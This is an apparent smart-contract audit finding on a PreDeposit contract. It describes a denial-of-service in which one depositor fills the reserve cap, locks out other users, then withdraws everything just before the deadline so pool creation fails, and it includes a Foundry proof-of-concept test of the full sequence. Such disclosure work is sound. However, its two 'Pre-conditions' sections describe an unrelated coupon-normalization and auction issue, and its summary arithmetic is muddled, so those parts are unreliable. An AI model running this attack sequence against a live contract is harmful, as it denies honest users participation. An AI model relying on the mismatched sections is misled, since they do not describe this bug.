# Exploiting Lack of Per-User Deposit Limit to Prevent Pool Creation in PreDeposit Contract

### Summary

The contract has a reserveCap of 10,000 tokens.
The attacker deposits 9,999 tokens (just 1 token less than the reserve cap).
 The attacker attempts to deposit 2 tokens again.
In this case,  balances[attacker] is 10,000.
And the others cannot deposit.

Just before the deposit period ends (depositEndTime), the attacker withdraws their entire deposit of 10,000 tokens.
So reserveAmount is updated to 0.
balances[attacker] is updated to 0.
so createPool function cannot perform.

### Root Cause


A single user (attacker) can deposit almost the entire reserve cap, leaving no room for others.
The contract adjusts deposits to fit the remaining cap, allowing the attacker to perfectly fill it with a second deposit.
The attacker can withdraw the full amount just before the deposit ends, leaving the pool with no funds to create a pool.

### Internal Pre-conditions

The Pool calculates couponAmountToDistribute in normalized 18 decimals.
The Auction processes bids with raw sellCouponAmount values.

### External Pre-conditions

Users place bids using sellCouponAmount without normalization.
Auction ends, and sellCouponAmount is transferred to the Pool.

### Attack Path

An attacker deposits twice - first  most of  reservecap (10,000 tokens) and some amount into the contract, reaching the maximum reserve capacity.
This prevents any other users from depositing tokens since the reserve cap has already been reached.
Just before the deposit period ends, the attacker withdraws their entire deposit of 10,000 tokens.
The total reserveAmount in the contract now becomes 0, leaving no funds to create the pool.
Since no deposits are left in the contract, the pool cannot be created.
Honest users who were prevented from depositing earlier cannot participate in the pool creation process, rendering the pool creation process unsuccessful.

### Impact

 The attacker can prevent the creation of the pool, effectively disrupting the protocol's intended functionality(DOS).
 Honest participants are unable to contribute to the pool because the reserve cap is monopolized by the attacker.
Such behavior can erode user trust in the protocol, as the system appears susceptible to manipulation.

### PoC

```solidity
function testDoSAttackWithReserveCap() public {
    uint256 attackerFirstDeposit = RESERVE_CAP - 1 ether;
    uint256 attackerSecondDeposit = 1 ether;

    // Attacker deposits almost the entire reserveCap
    vm.startPrank(user1); // Attacker as `user1`
    reserveToken.approve(address(preDeposit), attackerFirstDeposit);
    preDeposit.deposit(attackerFirstDeposit);
    assertEq(preDeposit.balances(user1), attackerFirstDeposit, "First deposit balance mismatch");
    assertEq(preDeposit.reserveAmount(), attackerFirstDeposit, "First deposit reserve mismatch");

    // Attacker deposits the remaining amount to reach the reserveCap
    reserveToken.approve(address(preDeposit), attackerSecondDeposit);
    preDeposit.deposit(attackerSecondDeposit);
    assertEq(preDeposit.balances(user1), RESERVE_CAP, "Second deposit balance mismatch");
    assertEq(preDeposit.reserveAmount(), RESERVE_CAP, "ReserveCap not reached");
    vm.stopPrank();

    // Another user tries to deposit but fails due to reserveCap being reached
    vm.startPrank(user2);
    reserveToken.approve(address(preDeposit), DEPOSIT_AMOUNT);
    vm.expectRevert(PreDeposit.DepositCapReached.selector);
    preDeposit.deposit(DEPOSIT_AMOUNT);
    vm.stopPrank();

    // Attacker withdraws their deposit just before the deposit period ends
    vm.startPrank(user1);
    vm.warp(block.timestamp + 7 days - 1 hours); // Just before depositEndTime
    preDeposit.withdraw(RESERVE_CAP);
    assertEq(preDeposit.balances(user1), 0, "Withdrawal failed to update balance");
    assertEq(preDeposit.reserveAmount(), 0, "Reserve amount not reset after withdrawal");
    vm.stopPrank();

    // Governance attempts to create the pool but fails due to zero reserve amount
    vm.startPrank(governance);
    preDeposit.setBondAndLeverageAmount(BOND_AMOUNT, LEVERAGE_AMOUNT);
    vm.warp(block.timestamp + 7 days); // After depositEndTime
    vm.expectRevert(PreDeposit.NoReserveAmount.selector);
    preDeposit.createPool();
    vm.stopPrank();
}
```

### Mitigation

Limit the maximum amount a single user can deposit to ensure fair participation.
